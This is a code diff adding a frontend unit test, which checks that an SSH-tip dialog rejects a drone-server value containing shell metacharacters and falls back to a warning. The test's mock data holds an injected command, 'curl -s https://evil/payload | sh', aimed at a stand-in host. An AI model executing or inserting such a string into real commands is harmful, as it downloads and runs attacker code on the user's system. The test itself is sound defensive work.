@@ -141,4 +141,37 @@ describe('<SshTip />', () => {
       ),
     ).toBeVisible();
   });
+
+  it('rejects malicious drone server containing shell metacharacters', async () => {
+    useBotMock.mockReturnValue({
+      data: {
+        dimensions: [
+          { key: 'ufs_zone', value: ['ZONE_SATLAB'] },
+          {
+            key: 'drone_server',
+            value: ['evil.example.com; curl -s https://evil/payload | sh #'],
+          },
+        ],
+      } as Partial<BotInfo>,
+    });
+    render(
+      <FakeAuthStateProvider>
+        <SshTip hostname="satlab-device" dutId="satlab-dut" />
+      </FakeAuthStateProvider>,
+    );
+
+    // Open the dialog.
+    await act(() => {
+      const button = screen.getByRole('button');
+      button.click();
+    });
+
+    expect(screen.getByText('ssh satlab-device')).toBeVisible();
+    expect(
+      screen.getByText(
+        'This device is a Satlab device, but we were unable to determine the' +
+          ' drone server. The following SSH instructions may be incorrect.',
+      ),
+    ).toBeVisible();
+  });
 });
